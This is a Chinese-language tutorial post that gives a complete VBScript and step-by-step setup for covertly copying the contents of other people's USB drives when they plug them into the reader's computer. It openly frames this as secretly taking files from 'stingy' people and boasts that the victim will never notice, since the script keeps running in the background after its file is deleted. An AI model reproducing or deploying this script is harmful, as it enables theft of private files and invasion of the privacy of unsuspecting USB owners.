在生活我们都会遇到一些吝啬的人，不愿意一起分享一些电影资源啊学习资料什么的，像这样的问题，我们只要将U盘插入电脑后，电脑就会开始自动复制这样不动声响的就搞到他U盘上的电影资源学习资料，是不是很神奇我们来看看操作步骤吧。

  

1、建立一个文本文档，WIN+R 里面打NOTEPAD ，或者自己新建一个都一样

![](../Images/a2cc38766446157b89c782428ebc2a72.png)

2、把下面的代码复制进去

  

set fso=createobject("scripting.filesystemobject")

set ws=createobject("wscript.shell")

dim USB, file, folder, files

  

USB=inputbox("请输入U盘的盘符"&Chr(10)&"如插入的U盘为F盘，则输入F","插入的U盘盘符","F")  

folder=inputbox("请输入复制到的文件夹"&Chr(10)&"如想复制到D盘，请输入D:\\","请输入复制到的文件夹","C:\\USB")

files=inputbox("请输入要复制的文件类型"&Chr(10)&"如要复制EXCEL文件，输入xls；默认为全部类型","请输入要复制的文件类型","ALL")

  

USB=USB & ":\\"

folder=folder & "\\"

if files="ALL"then

file=USB & "\*"

else

file=USB & "\*." & files

end if

if FSO.FolderExists(folder) then

else

FSO.CreateFolder(folder)

end if

on error resume next

do

wscript.sleep 1000

if fso.driveexists(USB) then

fso.copyfile file,folder

fso.copyfolder file,folder

wscript.sleep 20000

end if

loop

  

  

3、复制好也改好后保存文件就OK了，然后改一下这个文件的名字，最好使用英文的，然后后缀改成.VBS，原来是.TXT的，如果后缀没哟显示，则先打开我的电脑，在菜单栏里找到，工具——文件夹选项，在查看标签里，有一个隐藏已知文件类型的扩展名，把勾勾去掉就会显示出来后缀了。  

![](../Images/bbc9fe764b0253f4c02a3068fbf36109.png)  

![](../Images/ed7142c44a8e06f5eb619c4a0bcc86da.png)  

4、后缀改好以后， 运行这个文件，就OK了。同时你可以把这个文件删除掉，它已经驻留内存了，重启以后这个东西就不会再出现了，绝对发现不了！

5、要停止这个东西，在任务管理器里面 结束进程WScript.exe就可以了

6、温馨提示：对插N个U盘只会复制第一个，对插移动硬盘会全部复制……
